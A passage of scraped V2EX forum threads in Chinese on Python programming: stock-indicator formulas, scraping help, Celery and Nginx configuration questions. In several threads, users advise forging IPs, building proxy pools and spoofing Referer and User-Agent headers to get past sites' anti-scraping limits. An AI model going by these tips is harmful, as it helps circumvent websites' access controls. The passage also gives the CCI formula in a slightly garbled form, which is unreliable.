macdFactor.getPriorValue(stock);\nrecord(\"macd\",macd);\n}//end of handle_bar\n}</p>\n<p>2.RSI 指标(Relative Strength Index)</p>\n<p>RSI 的原理简单来说是以数字计算的方法求出买卖双方的力量对比，譬如有 100 个人面对一件商品，如果 50 个人以上要买，竞相抬价，商品价格必涨。相反，如果 50 个人以上争着卖出，价格自然下跌。</p>\n<p>强弱指标理论认为，任何市价的大涨或大跌，均在 0-100 之间变动，根据常态分配，认为 RSI 值多在 30-70 之间变动，通常 80 甚至 90 时被认为市场已到达超买状态，至此市场价格自然会回落调整。当价格低跌至 30 以下即被认为是超卖状态，市价将出现反弹回升。</p>\n<p>公式：</p>\n<p>LC := REF(CLOSE,1);</p>\n<p>RSI1:SMA(MAX(CLOSE-LC,0),N1,1)/SMA(ABS(CLOSE-LC),N1,1)*100;</p>\n<p>RSI2:SMA(MAX(CLOSE-LC,0),N2,1)/SMA(ABS(CLOSE-LC),N2,1)*100;</p>\n<p>RSI3:SMA(MAX(CLOSE-LC,0),N3,1)/SMA(ABS(CLOSE-LC),N3,1)*100;</p>\n<p>这里还有一种算法：</p>\n<p>RS:= SMA(MAX(CLOSE-LC,0),N,1)/SMA(ABS(CLOSE-LC),N,1)</p>\n<p>RSI:= 100*RS/(1+RS)</p>\n<p>简易实现代码：(前一个是 Java ，这一个是 Python)\ndef init(context):\ncontext.s=\"sha-601318\"\nuniverse.extend(context.s)\nf1=RSIFactor(14,'close')\nreg_factor(\"rsi\",f1)\ndef every_day(context,data):\nalldata=factor_output(\"rsi\",\"sha-601318\")\nrecord(\"RSI\",alldata[\"rsi\"])</p>\n<p>3.顺势指标（ CCI ）</p>\n<p>CCI 指标是美国股市技术分析 家唐纳德·蓝伯特(Donald Lambert)于 20 世纪 80 年代提出的，专门测量股价、外汇或者贵金属交易是否已超出常态分布范围。属于超买超卖类指标中较特殊的一种。波动于正无穷大和负无穷大之间。但是，又不需要以 0 为中轴线，这一点也和波动于正无穷大和负无穷大的指标不同。</p>\n<p>用法：</p>\n<p>1.当 CCI 指标曲线在+100 线～-100 线的常态区间里运行时,CCI 指标参考意义不大，可以用 KDJ 等其它技术指标进行研判。</p>\n<p>2.当 CCI 指标曲线从上向下突破+100 线而重新进入常态区间时，表明市场价格的上涨阶段可能结束，将进入一个比较长时间的震荡整理阶段，应及时平多做空。</p>\n<p>3.当 CCI 指标曲线从上向下突破-100 线而进入另一个非常态区间（超卖区）时，表明市场价格的弱势状态已经形成，将进入一个比较长的寻底过程，可以持有空单等待更高利润。如果 CCI 指标曲线在超卖区运行了相当长的一段时间后开始掉头向上，表明价格的短期底部初步探明，可以少量建仓。 CCI 指标曲线在超卖区运行的时间越长，确认短期的底部的准确度越高。</p>\n<p>4.CCI 指标曲线从下向上突破-100 线而重新进入常态区间时，表明市场价格的探底阶段可能结束，有可能进入一个盘整阶段，可以逢低少量做多。</p>\n<p>5.CCI 指标曲线从下向上突破+100 线而进入非常态区间(超买区)时，表明市场价格已经脱离常态而进入强势状态，如果伴随较大的市场交投，应及时介入成功率将很大。</p>\n<p>6.CCI 指标曲线从下向上突破+100 线而进入非常态区间(超买区)后，只要 CCI 指标曲线一直朝上运行，表明价格依然保持强势可以继续持有待涨。但是，如果在远离+100 线的地方开始掉头向下时，则表明市场价格的强势状态将可能难以维持，涨势可能转弱，应考虑卖出。如果前期的短期涨幅过高同时价格回落时交投活跃，则应该果断逢高卖出或做空。</p>\n<p>公式：</p>\n<p>第一种计算过程如下：</p>\n<p>CCI （ N 日）=（ TP － MA ）÷MD÷0.015</p>\n<p>其中， TP=（最高价+最低价+收盘价）÷3</p>\n<p>MA=近 N 日收盘价的累计之和÷N</p>\n<p>MD=近 N 日（ MA －收盘价）的累计之和÷N</p>\n<p>0.015 为计算系数， N 为计算周期</p>\n<p>简易实现代码：\nclass Myclass extends BackTestTradingStrategy{\nString stock = \"sha-601318\";\nCCIFactor cciFactor = new  CCIFactor();\nvoid init(BackTestContext context){<br>\nuniverse.add(stock);\n}//end of init</p>\n<p>void handleData(BackTestContext context,BarData data){\ndouble cci = cciFactor.getPriorValue(stock);\nrecord(\"cci\",cci);\n}//end of handle_bar\n}</p>\n<p>4.KDJ 指标</p>\n<p>KDJ 指标又叫随机指标，是一种相当新颖、实用的技术分析指标，它起先用于期货市场的分析，后被广泛用于股市的中短期趋势分析，是期货和股票市场上最常用的技术分析工具。</p>\n<p>随机指标 KDJ 一般是用于股票分析的统计体系，根据统计学原理，通过一个特定的周期（常为 9 日、 9 周等）内出现过的最高价、最低价及最后一个计算周期的收盘价及这三者之间的比例关系，来计算最后一个计算周期的未成熟随机值 RSV ，然后根据平滑移动平均线的方法来计算 K 值、 D 值与 J 值，并绘成曲线图来研判股票走势。</p>\n<p>*这个忒随机，如果封装成 Factor 有的用户认为不靠谱，所以 KDJ 指标就由大家自己用 Random 类来实现啦</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "量化：常见策略指标合集", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>淘宝商品月销量是 Ajax 异步加载//看回复</p>\n</div></div>"], "reply": "18", "tittle": "数据爬取、Ajax 探讨", "comment": ["  \r", "做了请求的限制、\r", "\r", " ", "  \r", "\r", "请大牛们提供下思路。伪造请求 IP ？", "目测是做了请求源的限制、、、", "貌似这个 API 需要店铺的 session ID 这类的 token 吧，具体需要阿里的文档，哪些 API 是需要 session ID 的", "代理池搞起", " #4 限制很严的", "同学,你搞错 URL 了吧?\r", "你第一张图里明明是 `initItemDetail.htm`  这个 URL, 而你第二张图请求另一个地址是啥意思?\r", "\r", "你不是想获取 销量吗?\r", "\r", "只需要 设定 Referer 就可以请求到数据 .\r", "\r", "```\r", "$ curl -se \"https://detail.tmall.com/item.htm\" \"https://mdskip.taobao.com/core/initItemDetail.htm?itemId=543399704177&callback=setMdskip\" | grep\r", "-Po \"\\\"sellCount\\\":\\d+,\"\r", "\"sellCount\":8308,\r", "\r", "```", "curl 执行之后后面的代码是\r", "```\r", "| grep -Po \"\\\"sellCount\\\":\\d+,\"\r", "```\r", "用来匹配出来 销量, 上面帖代码的时候换行了, 最后 一行是 最终的输出结果.", " #6 噢噢噢 \r", " ", " ", " #6  设定 Referer 也不行的吧", "  你用的工具有问题吧? 或者 你的 ip 已经 被封了? \r", "我上面发的 curl 的命令,你没执行一下试试?\r", "因 V2EX 上面帖图片不太方便, 我就不帖 curl 执行结果的截图了.", " #10 呃呃。好像可以了。感谢", "curl 的执行结果截图:\r", "\r", " ", " #12  ", " ", "用 selenium", " #13 可以了。通过其他方式去请求吧", " #14 nice", " #12 再次感谢", " 赞"]},
{"content": ["<div class=\"topic_content\">&lt;span&gt; &lt;/span&gt;\r<br>\r<br>上边这个代码中间我以为是空格，用 replace 替换不掉，一检查编码才发现不是空格，是\\u003F ，这样的应该怎么删？</div>"], "reply": "11", "tittle": "怎么删除特殊字符？", "comment": ["你的目的是什么，删除 span 中间的内容？", "用这则啊\\s", "replace('\\u003F', '') 一样删啊", " 删不掉啊，我试过了", " 对，就是想删掉中间内容", "\r", "\r", "黑人问号", " 可能是这个字符不是 003f...", " \r", "\r", "正则\r", "\r", "import re\r", "\r", "s='<span>asasdasd</span>'\r", "patt=re.compile('(?<=\\<span\\>).*(?=\\<\\/span\\>)')\r", "ans=patt.search(s)\r", "if ans:\r", "    print ans.group(0", "换个角度, 不用黑名单改成白名单", "当然不能 replace ，因为'\\u003F' == '?'\r", "你这里这个，在 html 里显示为&nbsp;的玩意，叫 no-break space ， unicode 为\\u00A0", " 嗯嗯，用 replace （'\\u00A0',''）通过了，我之前是用“文本转换工具”查看的编码。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>请问下，如何优雅的实现对 post json data 的 value 校验，比如：</p>\n<pre><code>curl -X POST -d '{\"string\": \"some string\", \"int\": 987}' http://$host/$api_path\n</code></pre>\n<p>目前我是使用 <code>flask-restful</code> 的 <code>reqparse</code> 来实现， 想请教下各位有啥其他办法能做这样的事情？</p>\n</div></div>"], "reply": "3", "tittle": "关于 flask json data 校验", "comment": ["JSON Schema", "marshmallow", "  这个棒棒的\r", "\r", "  谢谢"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>经常用 scrapy 框架，但是这个框架的 GET/POST 方法没有抽象出上传文件的参数，想问下自带的库或者 scrapy 有没有生成 form-data 的模块，丢进去一个文件，然后就生成出对应的报文。。</p>\n<pre><code>— xxx — \nContent-Disposition: form-data; name=” name ”\n\nzhangsan \n— xxx — \nContent-Disposition: form-data; name=” from ”\n\nbeijing \n— xxx — \nContent-Disposition: file; name=” record ”; filename=” record.txt ” \nContent-Type: text/plain\n</code></pre>\n</div></div>"], "reply": "3", "tittle": "Python 有没有生成 form-data 的模块", "comment": ["from requests.models import encode_multipart_formdata", "解决了，上面这个是 requests 的方法", "有个 FormRequest 不知是不是你要的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/tianshuang/aliyun-oss-sync\" rel=\"nofollow\">aliyun-oss-sync</a></p>\n<p>此脚本是用来发布我个人博客<a href=\"https://tianshuang.me/\" rel=\"nofollow\">Poison</a>而编写的，因为工作中常用语言为 Java ，而 Python 仅是副业，代码如有不当之处，敬请指出。</p>\n<p>逻辑很简单，递归遍历本地目录，然后判断每个文件在 OSS 里是否存在，如果不存在则直接上传，如果存在则检查 Content-Md5 是否相等，如果不相等则表明该文件内容已经发生变化，则上传该文件， OSS 会自动覆盖同名文件。</p>\n<p>值得注意的是检查 Content-Md5 的值是用的 HTTP 的 HEAD 方法，因为我们只需要 header 中的 Content-Md5 字段的值，所以并不需要使用 GET 方法拿到响应体，这样既加快了速度也节省了 OSS 流量。</p>\n<p>关于 oss_public_domain 变量的值，你如果在同地域内网的 ECS 上使用该脚本，建议使用内网域名，速度快并且节省了流量费用，否则使用外网域名。</p>\n</div></div>"], "reply": "6", "tittle": "阿里云 OSS 增量上传脚本", "comment": ["问题好多：\r", "\r", "1. requirements.txt 没有，依赖也没有说明\r", "2. oss2 本身就有 Bucket.get_object_meta(key)，不需要自己 request 去请求\r", "3. oss2 支持 Python 2.6 ， 2.7 ， 3.3 ， 3.4 ， 3.5 ，代码只兼容 python2 语法，很浪费\r", "4. 单线程上传\r", "5. 没有 main\r", "6. 没有参数解析或者配置文件，硬编码路径\r", "\r", "其它的想到了再说", "7. oss 里面 key 有限制，在 key 是无效的情况下怎么处理\r", "8. 使用普通的 Bucket.put_object ，有单文件上传大小限制，需要用分块上传或者 Bucket.append_object\r", "9. oss 的 md5 与程序里的 md5 能否保证是一致的，是否需要自己另外用统一的 hash ，使用额外的 meta 来处理", "大兄弟，感觉你的代码有点 low", "这样的文件判断也不是原子性的啊", " 谢谢指出，我也是接触 Python 不久，不是很熟悉相关代码规范，比如你说的参数解析这个问题，在 Java 里就可以用 jcommander ，因为不是很熟悉 Python 的生态，所以写得比较 low ，这个也是我那天下午有空草草看了下 OSS 的文档就编写出的第一个版本，你说的问题我下班了有空时都会一一修改，逐步迭代至正常的水准，额，最后能给个你的联系方式吗？到时 Python 不清楚的地方再请教下，谢谢", "关于上面第二点，经测试，对同一个文件，通过 Python SDK 中的 get_object_meta(key)方法拿到的信息比 HTTP HEAD 方法拿到的头信息要少几个字段，相比 HTTP HEAD 方法，正好少了 Content-Md5 这个字段。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>初学者想学写个爬虫，边学边写</p>\n<p>想要下载一张 Y 站的图片，代码为</p>\n<pre><code>urllib.request.urlopen('http://xxx.jpg').read()\n</code></pre>\n<p>其中 url 是可以正常访问的。图片不大，浏览器打开只需要几秒（排除缓存原因）。但在 python 中下载它却需要 30+秒，将下载到的数据写出为文件是可以正常查看的</p>\n<p>那么问题来了，究竟是什么原因导致下载一张图片那么慢呢？</p>\n<p>请问是还有什么地方需要配置吗？</p>\n<p>附完整代码：</p>\n<pre><code># 创建目录存放今天爬下来的图\ndir_name = datetime.datetime.now().strftime('%Y%m%d')\nif not os.path.exists(dir_name):\n    os.mkdir(dir_name)\n    \n# info[1] 的值为 https://files.yande.re/sample/6718a8caa71a4547a417f41bc9f063bb/yande.re%20385001%20sample%20byakuya_reki%20seifuku.jpg\nprint('开始下载……')\nprint(info[1])\ni = time.time()\nimg = urllib.request.urlopen(info[1]).read()\nprint('下载完毕。耗时：'+str(int(time.time() - i))+'s')\n\n# 获取文件名，并将%20 替换为空格\nfile_name = info[1].split('/')[-1].replace('%20', ' ')\nfile = open(dir_name+'/'+file_name, 'wb')\nfile.write(img)\nfile.close()\nexit(200)\n</code></pre>\n</div></div>", "<div class=\"topic_content\">经测试，是网站对爬虫限速了\r<br>加上 UA 、 Host 、 Referer 等头信息后一切正常， XD 谢谢各位</div>"], "reply": "17", "tittle": "Python3 用 urllib 下载图片非常慢，会是什么原因呢？", "comment": ["我打开这张图也要很久", " 可能是区域问题？但我浏览器打开很快呀，换个浏览器速度也差不多。我的代码是在本地运行的，怎么速度差那么多呢？", "也许服务器对爬虫限速了呢", "你看看是不是打开了系统代理", "浏览器有缓存吧", " 还真有这个可能……@CloudnuY 用的是 ss 的 pac 模式，这个不碍事吧？@gulu 换过浏览器一样几秒打开", "因为你浏览器走代理了,yandex 大一点的图片 2 30m,慢很正常", "跑了一下 ， 3s", " #4 用的是 ss 的 pac 模式，这个不碍事吧？\r", " #5 换过浏览器一样几秒打开\r", " #7 用的是 ss 的 pac 模式，这个不碍事吧？\r", " #8 就用上面的代码跑？ 3s ？", "如果挂 ss 的话，推荐使用这个库 PySocks\r", "具体使用参考 ", " #10 看起来不错。不过我正是初学，希望尽量以原生的方式实现，先收藏了", "一般调用 wget 下载", "还是挂个代理吧,萌妹的服务器时不时抽风,不太好判断.\r", "推荐用 requests 代替 urllib", "根据你的表述，就是系统代理没跑了。", "我一般用 urlretrieve", " en 跑了上面的代码是 3s 不知道是不是因为挂了代理", "1 loop, best of 3: 2.98 s per loop"]},
{"content": ["<div class=\"topic_content\">我这边本机起了两个 worker ，然后设置了 CELERYD_PREFETCH_MULTIPLIER 为 1 。\r<br>但是跑起来以后，发现 STARTED 和 RECEVED 都有一大把，结果把我机器给跑崩了。\r<br>\r<br>本来觉得是在 celery 起的 task 函数，里面的线程可能没优化好，导致这种情况，但后来觉得应该不会一次性 start 这么多的 task 啊。\r<br>\r<br>个人觉得应该是一个 worker 同时只会解决一个 task 才对，或者这个解决的量是可以配置的，我这里没找到配置选项。。。\r<br>\r<br>大家有没有什么好的办法，跪求解决方案！</div>"], "reply": "18", "tittle": "celery 每个 worker 在执行任务时，如何配置一定数量的 task？", "comment": ["新版本的 settings 名子改了， worker_prefetch_multiplier = 1 试试", "你设置的这是 fetch 的数量啊，不是 execute 的数量", " 先谢谢这位兄弟，不过我设置了 worker_prefetch_multiplier = 1 并没有起作用。\r", "\r", "另外，我看到网上有解释，“ celery 中的一个 worker 其实是代表一个进程池，一个进程池是由一个父进程和多个子进程组成， 貌似父进程不干事，只用于分配 task ，子进程数默认是 CPU 核数”\r", "\r", "故而我也试着配置了 CELERYD_MAX_TASKS_PER_CHILD = 2 ，但是貌似没起作用。\r", "\r", "还是每个 worker 分配 start 了好几个 task ， RECEVED 也一大把。 \r", "\r", "另外，我想问问大家怎么一次性，把那么多起来的 task 全部结束掉，每次 terminate 好多次。", " 兄弟求配置参数。。我没找到。。", " ", "  非常感谢兄弟，确实有效，要是能直接写到配置里就更好了， hhhh\r", "另外兄弟知道把那么 start 和 receive 后 task 全部结束掉么?\r", "我每次都是直接 ctrl+C 把 worker 结束掉，因为用的 redis 作中间件，最后还会手动清理 redis 的缓存内容，不然它还会一直运行下去。\r", "不过这样好像不太正规，也有点 bug 。", "犯不着写配置文件里啊，反正你也得从 celery worker 命令行启动，多个-c 参数的小事而已\r", "\r", "听不懂“把那么 start 和 receive 后 task 全部结束掉”", " 我的意思是：前台已经发了任务，存在了中间件（ redis ），然后后台取了任务，有的已经 start ，有的还在 receive 状态，如何把这些废弃的任务全部结束掉。\r", "我直接把那些 worker ctrl+c 掉的话，重新启动 worker 时，那些被废弃的任务还会继续跑。", "这细节动作我就没注意观察过了\r", "诶按说 redis 作为队列的话，取出来是不会放回去的啊？", " 你有用 multi 方式起 worker 吗，如果有的话，直接把起 worker 的命令中的 start 换成 stop 。 要清理废弃的任务的话，可以用 celery purge -Q queuename, 具体用法可以查看 celery purge --help", " 并没有用 multi 喔，至于您说的 queuename 是 task 名么？类似于“ e1e10f99-fb7b-42a4-b627-7ea0e74daf90 ”？我那边用 flower 控制的，但也没有看见批量清除的法子，有点头疼。。", " 没，我猜是放到了 redis 里面的，清除 redis 后过会儿会结束。\r", "但清除 redis 后再启动时， celery 还会调度一会儿 task ，这部分不知道是存在哪儿的，我一直很奇怪。", "看配置项`result_backend `, task 信息存在 result_backend 配置对应位置，还有`result_expires `配置项，所有 task 默认存 1 天", "不过 celelry 命令行有参数能干掉所有任务", " 谢谢兄弟，刚找了下干掉所有任务的参数，不过没找到。。有点伤", "`celery -h` 其他配置项就不说了\r", "看一下命令行说明\r", "````\r", "celery purge\r", "\r", "返回\r", "WARNING: This will remove all tasks from queue: celery.\r", "         There is no undo for this operation!\r", "\r", "(to skip this prompt use the -f option)\r", "\r", "Are you sure you want to delete all tasks (yes/NO)? \r", "````\r", "这是我本机的提示", "不知他能否干掉已经被 fetch 的命令，需要你排查", "  3ks ，我明天看看~~"]},
{"content": ["<div class=\"topic_content\">from bs4 import BeautifulSoup\r<br>import requests\r<br>import re\r<br>import random\r<br>import datetime\r<br>\r<br>random.seed(datetime.datetime.now())\r<br>def getLinks(articleUrl):\r<br>    html = requests.get('http://en.wikipedia.org/wiki/Kevin_Bacon')\r<br>    soup = BeautifulSoup(html.text, 'lxml')\r<br>    return soup.find('div', {'id': 'bodyContent'}).findAll('a', href=re.compile('^(/wiki/)(?!:).*$'))\r<br>\r<br>links = getLinks('/wiki/Kevin_Bacon') \r<br>while len(links) &gt; 0:   \r<br>    newArticle = links[random.randint(0, len(links)-1)].attrs['href']   ############################################\r<br>    print(newArticle)\r<br>    links = getLinks(newArticle)\r<br>\r<br>不明白这里 newArticle = links[random.randint(0, len(links)-1)].attrs['href'] \r<br>links 为什么不能用()，一定要用[ ]</div>"], "reply": "40", "tittle": "高一学生，自学 Python ，请教各位大神，谢谢。", "comment": ["oh ，明白了，切片。\r", "shit~", "加油，点我简介，可以加群一起学 ^_^", "我觉得吧你应该先看 bs4 的 api 文档", "238 天前 - 刚上高一\r", "238 天后 - 高一学生\r", "\r", "没有任何奇怪的意思，就路过抖个机灵", " 没什么不对的，可能是 py 玩太 high 留级了呢", " #5 要是把 py 翻译成 屁眼 ， 哪么读起来就更 high", " 我服。。", "我觉得你有那时间上个好大学在大学里面学更好，前面的人为什么就不好好劝劝？", " 编程要从小学教起好吗！", " py 从入门到放弃", "哇塞，高一的时候完全没概念", "为什么大家就不好好回答呢？\r", "那么就我来回答你：请重新学习 Python 的基础知识", "首先，这行大学很重要，千万别因为学编程耽误高考，学着玩的话我感觉不如去跑跑步。\r", "其次，上面的道理你知道的话，那样两条选择，要么去把基础知识好好学学，要么别来 V2 这种“专业”的地方问。", "看到某些网友的回复,真是不如不回,他只是一个想学习编程的高一学生.提了一些可能对于大神们相对幼稚的问题,干嘛要抨击他呢,又是跑步又是学习的,人家就是正在学习好吗,V2EX 本身除了分享就是学习的地方.找到专业的地方想让高人指点还有错了? 打击人家信心干嘛,老是好像站在人生制高点俯瞰众生的态度,我看你也不咋滴! \r", "好多程序员都说国内社区环境不好,这个那个毛病一堆,那到是改善啊,从自身改善不可以吗.帮助别人本身也是可以提升社区环境的呀.只会喷!!!!   我不是程序员,我也没法解答这个朋友的问题.但是我清楚,有个好学的心是好的.哪怕有些弯路要走.", " 高一学编程已经不早了。\r", "周围认识几个厉害的人，都是初中高中就开始学了。\r", "之前还认识几个小学就开始写程序或者玩技术的牛人。\r", "\r", " 唔，凭什么不能来 V2 问？", " 因为回复大多没帮助呗。", " 跑步估计是说我，我感觉你误会了。\r", "我见过很多学生因为学编程耽误高考，甚至放弃高考，作为休闲也不是个好选择，所以看见高中生学编程就习惯性的提醒一下。\r", "\r", "至于你说 V 站环境不好，我也是同意的，所以我建议楼主适应或者干脆换个环境（不是认为楼主怎么样）。我感觉指望 V 站本身改变不现实，真要变了也就不是 V 站了。", "问问题没啥说道,关键是高中特别重要,别捡了芝麻丢了西瓜,等考上了 985 别说 python 了,哪个语言不随便玩?非得高中这 3 年玩.", "如果只是提问，建议不要夹带其他内容，比如性别，年龄，学历之类的。", " 大多没帮助的话，说明还是有一些帮助的。\r", "如果不来 V 站，那就连那一丁点帮助都拿不到了。╮(╯_╰)╭", " \r", "\r", "又不是就 V 站一家网站啊\r", "别的网站可能就直接告诉你 links 是 getLinks 返回时数组，数组用[]，函数用()，就这么简单。", "我擦 高一啊 这将来前途不可限量啊 大一我都没想着学代码", " V 站也还算可以了。总不能介绍撸主去 RubyChina 吧 :doge:", "高一这样学编程不是不可以，性价比不高，建议参加信息学竞赛", " 感觉 炮友 更 (｡･∀･)ﾉﾞ嗨", " #25 两样我都没玩过，捂脸路过。", "只有一点，不喜欢问问题时带上 诸如： \r", "> 我是小白，我是妹子， 我是初一，我是小学之类......\r", "我只想跟你讨论问题，仅限于此，不关心你的身份，也不要用其余来博取眼球，只会自降身份。\r", "不针对题主，只是看很多对此意见不一，表达一下自己的观点。", "谢谢大家的热情，评论都看了，也没啥，万事起头难，不耻下问呗。\r", "现在拍砖头总比以后背后捅你一枪要好得多，没人一生下来就会编程的，坑都是一步一个脚印摸出来。\r", "听大人说，很多人生活不如意就来网上发泄，大家应该多同情那些人，毕竟他们也只能对我们这种菜鸟牛逼。", "哈哈我记得大一第一节 c 语言上机课，我敲#include 敲了 n 遍都不对", " #28 说实话我觉得上面大部分人是经由自己的人生经验给你提出的建议，至于对错你可以自己判断，最后一句话就没意思了。\r", "\r", "还有，不能乱用「不耻下问」……", "编程是门工具，数学是基础，好好学，加油", "感觉还是先放一放编程，好好学学校的课，考个好大学，才是最正确的", " 知道了，好吧。", "基础不太扎实", "就知道上面会有人歪楼，不回答问题专门冲着楼主“高一”这个字眼来。", "不知为啥，看标题像是炫耀帖。哈哈哈，高一我似乎在魔兽争霸啊。", "高一貌似我在星际争霸", "我擦，高一就学了，我都大学毕业，工作了一年才开始学，羡慕呀", "其实和他高一或者是不是新手无关，主要这个问题可能对大多数人并没有帮助。你可以看看提问的智慧( ", " v 站问，只是 v 站上出现这种问题一般情况下，可以认为是 V 站的用户质量下降了。因为一般问这种问题的，贴吧，百度知道之类的。\r", "这里因为是列表，所以用[]。如果是函数就可以用()。至于为什么这么设计，你可以认为是语言的风格，等你上到大学，学过相应的课程可能会理解语言开发者为什么这么设计。下面回复说的，好好去看遍基础课程并没有错，谁都有新手的时候，但新手或菜鸟并不是万能的理由。我觉得下面不回答楼主问题的，还说好好看基础的并没什么错。", " 找到工作了吗?"]},
{"content": ["<div class=\"topic_content\">URL 如果是 123 456,浏览器点击后就会变成 123%20456\r<br>在 django 自带的调试服务中,通过 URL 正则获取到的值是 123 456,一点问题没有\r<br>\r<br>但通过 nginx+django+gunicorn 部署到生产服务器,获取到的值是 123%20456,然后导致与数据库交互有一些错误,但感觉也不是 django 的 bug 啊~难道是 nginx+gunicorn 的问题?我是通过 proxy_pass 传递数据的~</div>"], "reply": "2", "tittle": "nginx+django+gunicorn 遇到 URL 空格转义问题~", "comment": ["注意你的 url 里面 123 和 456 的空格，应该是空格 urlencode 转换成了%20", " 已经找到解决办法了,我把 gunicorn 的 worker 由 aiohttp 换成 gevent 就好了~估计是 aiohttp 的锅"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>nginx 的配置文件：</p>\n<pre><code>server {\n    listen         80;\n    server_name    127.0.0.1\n    charset UTF-8;\n    access_log      /var/log/nginx/myweb_access.log;\n    error_log       /var/log/nginx/myweb_error.log;\n\n    client_max_body_size 75M;\n\n    location / {\n        include uwsgi_params;\n        uwsgi_pass 127.0.0.1:8023;\n        uwsgi_read_timeout 2;\n    }\n    location /static {\n        expires 30d;\n        autoindex on;\n        add_header Cache-Control private;\n        alias /home/work/JZAssist/collected_static/;\n     }\n }\n</code></pre>\n<p>我的 supervisord 中的 command 是</p>\n<pre><code>command=uwsgi --http :8023 --chdir /home/work/xxxx --module xxxx.wsgi\n</code></pre>\n<p>xxxx 是项目名称。\n问题是可以通过域名加端口访问，但是直接用域名访问就出现 504 Gateway Time-out 。我重装过 nginx,但看起来好像并不是 nginx 的问题。</p>\n</div></div>"], "reply": "18", "tittle": "可以通过域名加端口访问，但是直接用域名访问就 504 Gateway Time-out", "comment": ["uwsgi_read_timeout  好像小了点", "你域名解析到哪个 ip ？\r", "是不是没监听到....", " 就只有一个 ip 。为什么域名加端口就可以访问？", " 之前设置成这样也没问题。", "sever name 不应该是写域名么？", "  换 gunicorn", " 可以这样写吧。", " 如果实在不行就换 gunicorn ，之前也是这样配置，都没有问题。", "你的 uwsgi 好像是开了个 8023 的 HTTP 端口，你 nginx 居然尝试用 uswsgi 协议连？\r", "\r", "        include uwsgi_params;\r", "        uwsgi_pass 127.0.0.1:8023;\r", "        uwsgi_read_timeout 2;\r", "\r", "把 uwsgi 换成 proxy 吧，你这个需要用 proxy_pass 127.0.0.1:8023;", "如果 nginx 配置上写的是 uwsgi_pass  那么 uwsgi 启动的命令行参数应该写成 socket 而不是 http\r", "command=uwsgi --socket :8023 --chdir /home/work/xxxx --module xxxx.wsgi", " \r", " \r", "确实和你们说的一样。\r", "可能我在配置的时候有点混乱，然后把不同操作的命令混进来了。\r", "谢谢！！！", "不贴日志都能猜出来，服你们！", "server {\r", "    listen         80;\r", "    server_name    127.0.0.1\r", "    ....\r", "}\r", "\r", "\r", "\r", "这三行的意思可能 LZ 没懂，我帮你翻译一下：只有 ", " 这种形式的网址才能被这个 server  { } 块里的配置匹配到。\r", "\r", "如果你配置了个域名，不知道你的 server_name 飞到什么鬼地方去了。", " 看来还要系统学习下才行。谢谢啦。", " 你应该好好看看 nignx 文档：“ If a server is the only server for a listen port, then nginx will not test server names at all (and will not build the hash tables for the listen port). However, there is one exception. If a server name is a regular expression with captures, then nginx has to execute the expression to get the captures.”", " 你觉得 LZ 这配置就是你贴文档里所说的 the only server 么。", "我记得当时我在部署 django+uWSGI+Nginx 的时候也出现过这个问题，但最后是怎么解决的有些忘了。。你看一下官方文档步骤，再重来一遍： ", "这个可以作为面试题，挺好的。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近开始学习 python 爬虫，尝试爬取虾米音乐上的歌曲的试听数，但是发现网页源码中好像加密了。有人研究过这个吗？</p>\n</div></div>"], "reply": "4", "tittle": "如何获取虾米音乐的每首歌的试听数？", "comment": ["getplaycount 借口，{'id':song_id,'type':'song', '_xiamitoken':_xiamitoken}，然后获取 data.plays", "例子： ", " ，\r", "数据{\"plays\":426106,\"status\":\"ok\"}", " #2 确实有效，非常感谢！", " 请问这个 api 有在线文档可以查么？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Python 的优点是高效，从零到爬半个小时估计就能动起来。</p>\n<p>Node.js 更侧重于 io 处理，但其 Javascript 语言特性也能带来高效的开发体验。</p>\n<p>两者都有不错的异步性能， Python 3 之后已经原生支持协程， Node.js 更不用说了。</p>\n<p>所以这两个用于爬虫，如果都熟练掌握，你会更倾向于哪一个？</p>\n</div></div>"], "reply": "39", "tittle": "Python vs Node.js 哪个更适合用于爬虫？", "comment": ["选 js", "c++", "node", "额，看你熟练哪种语言呗，我用 php ，毕竟 phpquery 可以像 jquery 一样操作获取到的 html 文本，通过 curl 函数就可以异步或同步的模拟浏览器操作。", "js 的好处是可以直接在浏览器里跑，想想就带劲", " Node.js +1\r", " 不嫌麻烦？\r", " Node.js +1\r", " PHP +1", "node 请使用 v7.6.0 ，直接用 async/await 无痛开写，开了跨域代理还可以直接在 chrome 里跑", "node +1, 性能好, 还有 PhantomJS 模拟浏览器", "要不要试试 neocrawler", "曾经是 phantomJS 做代理抓取渲染页面， python 在另一端处理任务，对抓到数据进行规整。这算是两个都用么？", "scrapy +1", " PhantomJS 对于大规模爬虫应用的话，性能如何？", " #7 求详细，是说 node-inspector 吗？", "现在爬虫的性能早就不是问题 难点在动态数据和反爬虫上\r", "\r", "你不是会挂代理么 吼哇 那我们就玩注册吧", "哪个熟悉点就用哪个呗 \r", "个人偏向 node 毕竟 js 语言摆在那😄", " 有人自称组件了 1000+实例的集群 除了每隔一段时间要强制重启释放资源外 没啥", " 内存泄漏", "个人感觉大规模的爬虫都不应该使用基于 Chrome 的技术，基于 mozilla 的 spidermonkey 来做的爬虫可能性能会更好，关键是 V8 的引擎并非线程安全，你用到 V8 的时候就需要加锁，要提高并行就是加进程。一台服务器能上多少个进程？", " \r", " \r", "\r", "感谢！", "都适合。 nodejs 有个额外好处是能直接解释执行页面上部分 js 代码（虽然要考虑安全性）。", "PHP", " 你可以一直加服务嘛，性能不够机器来凑。不过确实是要隔一段时间重启 phantomJS ，不知道是不是内存泄露，隔一段时间内存跑的高的不行。我当时是做进程池，每个 phantomJS 能跑十几次任务就直接让它重启了。", " 线程和进程有区别么，难道用线程渲染页面的 cpu 负载就能下来？", "如果只是爬虫的话，用自己最熟悉的最好\r", "如果还想对爬来的数据进行分析的话，那 Python 更好，有 pandas 这样的神器，还有很多统计、机器学习方面的库", "node 一个巨大的优势在于如果你要爬的页面用 js 搞了个前端加密，虽然没有什么用但是 python 就很难处理", "Python", " 你开进程需要内存的啊，线程可是共享内存啊。", " \r", "\r", "node 不是有 vm 么", " 作为平台无关的动态语言，大家都有 vm 